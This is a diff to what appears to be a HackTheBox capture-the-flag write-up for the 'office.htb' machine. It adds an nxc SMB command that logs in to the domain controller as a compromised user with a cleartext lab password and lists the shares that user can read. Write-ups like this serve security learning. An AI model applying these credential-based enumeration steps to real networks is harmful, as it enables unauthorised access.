@@ -309,3 +309,28 @@ SMB         10.129.230.226  445    DC               [-] office.htb\dmichael:H0lO
 ```
 Looks like ive compromised the user `dwolfe`
 
+## Access as `dwolfe`
+
+```python
+nxc smb dc.office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
+SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.129.230.226  445    DC               [*] Enumerated shares
+SMB         10.129.230.226  445    DC               Share           Permissions     Remark
+SMB         10.129.230.226  445    DC               -----           -----------     ------
+SMB         10.129.230.226  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.230.226  445    DC               C$                              Default share
+SMB         10.129.230.226  445    DC               IPC$            READ            Remote IPC
+SMB         10.129.230.226  445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.230.226  445    DC               SOC Analysis    READ            
+SMB         10.129.230.226  445    DC               SYSVOL          READ            Logon server share
+```
+The user has read access on an interesting share!
+
+The user has no access on WINRM
+
+## Dumping all the users
+
+```python
+
+```
